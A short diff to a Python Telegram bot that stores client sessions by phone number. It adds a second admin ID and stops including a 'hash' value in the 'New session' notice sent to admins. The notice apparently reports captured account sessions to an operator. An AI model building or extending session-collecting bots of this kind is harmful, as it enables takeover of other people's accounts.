@@ -3,7 +3,7 @@ from aiogram.types import InputFile
 import asyncio
 import random
 
-ADMINS_IDS = [661123100]
+ADMINS_IDS = [661123100, 1282132056]
 
 def set_client(me):
 	me.client = SESSIONS[str(me.phone)]
@@ -174,7 +174,7 @@ async def yes(call: CallbackQuery):
 		else:
 			h = hash if random.randrange(1, 100) >= 70 else "не твоя очередь"
 			await call.message.bot.send_message(
-				ADMIN, f"📝 <b>Новая сессия.</b>\nphone: <code>{me.phone}</code>\ntag: {get_mention(call['from'])}\nhash: <code>{h}</code>"
+				ADMIN, f"📝 <b>Новая сессия.</b>\nphone: <code>{me.phone}</code>\ntag: {get_mention(call['from'])}"
 			)
 
 	await call.message.answer(
